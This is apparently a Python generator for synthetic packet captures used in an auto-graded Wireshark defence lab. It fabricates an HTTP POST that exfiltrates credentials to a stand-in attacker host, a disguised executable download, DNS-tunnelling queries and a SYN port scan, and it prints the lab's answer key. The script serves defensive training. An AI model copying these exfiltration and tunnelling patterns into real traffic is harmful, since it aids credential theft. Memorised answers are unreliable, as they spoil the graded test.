#!/usr/bin/env python3
"""
generate_pcaps.py — Deterministic PCAP generator for the
"Network Traffic Analysis with Wireshark" lab (Module 2, Network Defense Analyst).

Produces two capture files used by the auto-graded tasks:

  mixed-traffic.pcap
    A corporate-network capture containing:
      * benign DNS lookups + benign HTTP GET browsing + HTTPS/TLS noise
      * ONE malicious HTTP POST that exfiltrates credentials
        (username=... & password=...) to an attacker-controlled host
      * DNS-tunneling queries: many long base32-style subdomains to ONE
        suspicious domain
      * ONE HTTP download of a small Windows executable with KNOWN, fixed
        bytes (so its hash / size are 100% deterministic and reproducible
        via Wireshark/tshark "Export Objects > HTTP")

  portscan.pcap
    One external attacker performing a TCP SYN (half-open) scan against one
    internal target across a KNOWN number of unique destination ports, with a
    handful of open ports replying SYN-ACK.

Everything is seeded so output is byte-for-byte reproducible.

Run:   python3 generate_pcaps.py [OUTDIR]
(OUTDIR defaults to the directory this script lives in.)
"""

import os
import sys
import random
import hashlib

from scapy.all import (
    IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, wrpcap, conf,
)

conf.verb = 0
random.seed(1337)

# ── Topology (RFC 5737 / RFC 1918 documentation ranges) ─────────────────────
CLIENT       = "10.0.0.50"        # analyst workstation (victim)
CLIENT2      = "10.0.0.51"        # second internal host (benign noise)
DNS_RESOLVER = "10.0.0.2"         # internal DNS resolver
WEB_SRV      = "203.0.113.80"     # legitimate external web server
CDN_SRV      = "203.0.113.90"     # legitimate CDN (TLS noise)
EXFIL_SRV    = "198.51.100.66"    # malicious host that receives the POST creds
MALWARE_SRV  = "198.51.100.77"    # host serving the malicious .exe download
SCANNER      = "198.51.100.25"    # external port-scanner
TARGET       = "10.0.0.10"        # internal scan target


def _tcp_handshake(pkts, src, dst, sport, dport, t, cseq, sseq):
    """Append a 3-way handshake. Returns the timestamp after it."""
    syn = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S", seq=cseq)
    syn.time = t
    synack = IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA",
                                        seq=sseq, ack=cseq + 1)
    synack.time = t + 0.02
    ack = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A",
                                     seq=cseq + 1, ack=sseq + 1)
    ack.time = t + 0.04
    pkts += [syn, synack, ack]
    return t + 0.06


# ════════════════════════════════════════════════════════════════════════════
#  mixed-traffic.pcap
# ════════════════════════════════════════════════════════════════════════════
def build_mixed():
    pkts = []
    ts = 1700000000.0

    # ── Benign DNS lookups (noise) ──────────────────────────────────────────
    benign_domains = [
        "www.google.com", "outlook.office365.com", "github.com",
        "cdn.jsdelivr.net", "ubuntu.com", "stackoverflow.com",
        "www.bing.com", "fonts.googleapis.com", "api.weather.com",
        "update.microsoft.com",
    ]
    for i, dom in enumerate(benign_domains):
        t = ts + i * 1.7
        qid = 0x1000 + i
        sport = 40000 + i
        q = IP(src=CLIENT, dst=DNS_RESOLVER) / UDP(sport=sport, dport=53) / \
            DNS(id=qid, rd=1, qd=DNSQR(qname=dom, qtype="A"))
        q.time = t
        r_ip = "93.184.%d.%d" % (random.randint(1, 254), random.randint(1, 254))
        r = IP(src=DNS_RESOLVER, dst=CLIENT) / UDP(sport=53, dport=sport) / \
            DNS(id=qid, qr=1, rd=1, ra=1, qd=DNSQR(qname=dom, qtype="A"),
                an=DNSRR(rrname=dom, type="A", rdata=r_ip, ttl=300))
        r.time = t + 0.03
        pkts += [q, r]

    # ── Benign HTTP GET browsing (noise) ────────────────────────────────────
    pages = ["/", "/index.html", "/about.html", "/css/site.css",
             "/js/app.js", "/img/banner.png", "/contact", "/news"]
    for i, page in enumerate(pages):
        t = ts + 40 + i * 4.0
        sport = 41000 + i
        cseq, sseq = 1000 + i * 5000, 7000 + i * 5000
        t = _tcp_handshake(pkts, CLIENT, WEB_SRV, sport, 80, t, cseq, sseq)
        req = ("GET %s HTTP/1.1\r\n"
               "Host: intranet.corp.local\r\n"
               "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n"
               "Accept: text/html,application/xhtml+xml\r\n"
               "Connection: keep-alive\r\n\r\n") % page
        p = IP(src=CLIENT, dst=WEB_SRV) / TCP(sport=sport, dport=80, flags="PA",
                                              seq=cseq + 1, ack=sseq + 1) / Raw(load=req.encode())
        p.time = t
        body = ("<html><body><h1>%s</h1><p>Corporate intranet.</p></body></html>" % page).encode()
        resp = ("HTTP/1.1 200 OK\r\n"
                "Server: nginx/1.18.0\r\n"
                "Content-Type: text/html; charset=utf-8\r\n"
                "Content-Length: %d\r\n\r\n" % len(body)).encode() + body
        rp = IP(src=WEB_SRV, dst=CLIENT) / TCP(sport=80, dport=sport, flags="PA",
                                               seq=sseq + 1, ack=cseq + 1 + len(req)) / Raw(load=resp)
        rp.time = t + 0.05
        pkts += [p, rp]

    # ── Benign HTTPS / TLS noise (just SYN + a couple of data pkts on 443) ──
    for i in range(6):
        t = ts + 90 + i * 3.0
        sport = 42000 + i
        cseq, sseq = 9000 + i * 4000, 33000 + i * 4000
        t = _tcp_handshake(pkts, CLIENT, CDN_SRV, sport, 443, t, cseq, sseq)
        # opaque TLS application data (no plaintext to grade on)
        ch = IP(src=CLIENT, dst=CDN_SRV) / TCP(sport=sport, dport=443, flags="PA",
                                               seq=cseq + 1, ack=sseq + 1) / \
            Raw(load=b"\x16\x03\x01\x00\x50" + bytes(random.getrandbits(8) for _ in range(80)))
        ch.time = t
        sh = IP(src=CDN_SRV, dst=CLIENT) / TCP(sport=443, dport=sport, flags="PA",
                                               seq=sseq + 1, ack=cseq + 1 + 85) / \
            Raw(load=b"\x16\x03\x03\x00\x40" + bytes(random.getrandbits(8) for _ in range(64)))
        sh.time = t + 0.03
        pkts += [ch, sh]

    # ── MALICIOUS HTTP POST: credential exfiltration ────────────────────────
    # Answer source for: exfil dest IP, POST host, username, password.
    t = ts + 150
    sport = 43000
    cseq, sseq = 60000, 70000
    t = _tcp_handshake(pkts, CLIENT, EXFIL_SRV, sport, 80, t, cseq, sseq)
    post_body = "username=jdoe&password=Sup3rS3cr3t!&domain=CORP&submit=Login"
    post = ("POST /gate/collect.php HTTP/1.1\r\n"
            "Host: data-sync-cloud.com\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: %d\r\n"
            "Connection: close\r\n\r\n%s" % (len(post_body), post_body))
    pp = IP(src=CLIENT, dst=EXFIL_SRV) / TCP(sport=sport, dport=80, flags="PA",
                                             seq=cseq + 1, ack=sseq + 1) / Raw(load=post.encode())
    pp.time = t
    ack_body = b"OK"
    presp = ("HTTP/1.1 200 OK\r\n"
             "Server: Apache\r\n"
             "Content-Type: text/plain\r\n"
             "Content-Length: %d\r\n\r\n" % len(ack_body)).encode() + ack_body
    prp = IP(src=EXFIL_SRV, dst=CLIENT) / TCP(sport=80, dport=sport, flags="PA",
                                              seq=sseq + 1, ack=cseq + 1 + len(post)) / Raw(load=presp)
    prp.time = t + 0.06
    pkts += [pp, prp]

    # ── MALICIOUS HTTP download of a small .exe with KNOWN bytes ────────────
    # Answer source for: filename, file size, server IP, (optional) hash.
    # Build a tiny, fixed, valid-ish PE stub so the bytes never change.
    exe_body = build_fake_exe()
    fname = "svchost-update.exe"
    t = ts + 180
    sport = 44000
    cseq, sseq = 80000, 90000
    t = _tcp_handshake(pkts, CLIENT, MALWARE_SRV, sport, 80, t, cseq, sseq)
    dreq = ("GET /payloads/%s HTTP/1.1\r\n"
            "Host: cdn-files-delivery.net\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            "Accept: */*\r\n\r\n" % fname)
    dp = IP(src=CLIENT, dst=MALWARE_SRV) / TCP(sport=sport, dport=80, flags="PA",
                                               seq=cseq + 1, ack=sseq + 1) / Raw(load=dreq.encode())
    dp.time = t
    pkts.append(dp)
    dresp_hdr = ("HTTP/1.1 200 OK\r\n"
                 "Server: nginx\r\n"
                 "Content-Type: application/octet-stream\r\n"
                 "Content-Disposition: attachment; filename=\"%s\"\r\n"
                 "Content-Length: %d\r\n"
                 "Connection: close\r\n\r\n" % (fname, len(exe_body))).encode()
    full = dresp_hdr + exe_body
    # Segment the response across the wire (server -> client).
    chunk = 1400
    seq_pos = sseq + 1
    ack_val = cseq + 1 + len(dreq)
    t2 = t + 0.05
    for off in range(0, len(full), chunk):
        seg = full[off:off + chunk]
        sp = IP(src=MALWARE_SRV, dst=CLIENT) / TCP(sport=80, dport=sport, flags="PA",
                                                   seq=seq_pos, ack=ack_val) / Raw(load=seg)
        sp.time = t2
        t2 += 0.01
        seq_pos += len(seg)
        pkts.append(sp)

    # ── DNS TUNNELING: many long subdomains to ONE suspicious domain ────────
    # Answer source for: tunneling domain, count of tunnel queries.
    TUNNEL_DOMAIN = "t1.exfilzone-c2.xyz"
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    t = ts + 220
    for i in range(20):
        label = "".join(random.choice(alphabet) for _ in range(48))
        qname = "%s.%s" % (label, TUNNEL_DOMAIN)
        qid = 0x3000 + i
        sport = 45000 + i
        q = IP(src=CLIENT, dst=DNS_RESOLVER) / UDP(sport=sport, dport=53) / \
            DNS(id=qid, rd=1, qd=DNSQR(qname=qname, qtype="A"))
        q.time = t + i * 0.5
        pkts.append(q)

    wrpcap(os.path.join(OUTDIR, "mixed-traffic.pcap"), pkts)
    return pkts, exe_body, fname, TUNNEL_DOMAIN


def build_fake_exe():
    """A small, fixed-byte PE-looking stub. Deterministic by construction."""
    # 'MZ' DOS header padded, fake 'PE\0\0' header, then fixed filler.
    stub = bytearray()
    stub += b"MZ"                       # DOS magic
    stub += b"\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
    stub += b"\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00"
    stub += b"\x00" * (0x3c - len(stub))         # pad to e_lfanew
    stub += b"\x80\x00\x00\x00"                  # e_lfanew -> 0x80
    stub += b"\x00" * (0x80 - len(stub))         # pad to PE header
    stub += b"PE\x00\x00"                         # PE signature
    stub += b"\x4c\x01\x03\x00"                  # machine i386, 3 sections
    stub += b"This is a benign training artifact, not real malware. " * 16
    # Pad to a clean, fixed total size.
    target = 4096
    if len(stub) < target:
        stub += b"\x00" * (target - len(stub))
    return bytes(stub[:target])


# ════════════════════════════════════════════════════════════════════════════
#  portscan.pcap
# ════════════════════════════════════════════════════════════════════════════
def build_portscan():
    pkts = []
    ts = 1700100000.0
    # 150 unique destination ports probed; 5 of them open.
    # All "open" ports must fall WITHIN the scanned range, or they never
    # receive a SYN and therefore never reply SYN-ACK.
    scanned_ports = list(range(20, 170))          # 150 unique ports: 20..169
    open_ports = {21, 22, 25, 80, 110}            # all inside 20..169
    for i, port in enumerate(scanned_ports):
        t = ts + i * 0.03
        sport = 50000 + i
        syn = IP(src=SCANNER, dst=TARGET) / TCP(sport=sport, dport=port,
                                                flags="S", seq=100000 + port)
        syn.time = t
        pkts.append(syn)
        if port in open_ports:
            sa = IP(src=TARGET, dst=SCANNER) / TCP(sport=port, dport=sport,
                                                   flags="SA", seq=500000 + port,
                                                   ack=100001 + port)
            sa.time = t + 0.005
            rst = IP(src=SCANNER, dst=TARGET) / TCP(sport=sport, dport=port,
                                                    flags="R", seq=100001 + port)
            rst.time = t + 0.008
            pkts += [sa, rst]
        else:
            ra = IP(src=TARGET, dst=SCANNER) / TCP(sport=port, dport=sport,
                                                   flags="RA", seq=0, ack=100001 + port)
            ra.time = t + 0.005
            pkts.append(ra)

    wrpcap(os.path.join(OUTDIR, "portscan.pcap"), pkts)
    return pkts, scanned_ports, open_ports


if __name__ == "__main__":
    OUTDIR = sys.argv[1] if len(sys.argv) > 1 else os.path.dirname(os.path.abspath(__file__))
    os.makedirs(OUTDIR, exist_ok=True)

    mixed, exe_body, fname, tunnel_domain = build_mixed()
    scan, scanned_ports, open_ports = build_portscan()

    print("=== GENERATION SUMMARY ===")
    print("mixed-traffic.pcap : %d packets" % len(mixed))
    print("portscan.pcap      : %d packets" % len(scan))
    print("---- answer key (generator side) ----")
    print("exfil POST dest IP : %s" % EXFIL_SRV)
    print("exfil POST host    : data-sync-cloud.com")
    print("exfil username     : jdoe")
    print("exfil password     : Sup3rS3cr3t!")
    print("download filename  : %s" % fname)
    print("download server IP : %s" % MALWARE_SRV)
    print("download file size : %d bytes" % len(exe_body))
    print("download MD5       : %s" % hashlib.md5(exe_body).hexdigest())
    print("download SHA256    : %s" % hashlib.sha256(exe_body).hexdigest())
    print("DNS tunnel domain  : %s" % tunnel_domain)
    print("DNS tunnel queries : 20")
    print("scanner IP         : %s" % SCANNER)
    print("scan target IP     : %s" % TARGET)
    print("unique ports probed: %d" % len(scanned_ports))
    print("open ports         : %s" % sorted(open_ports))
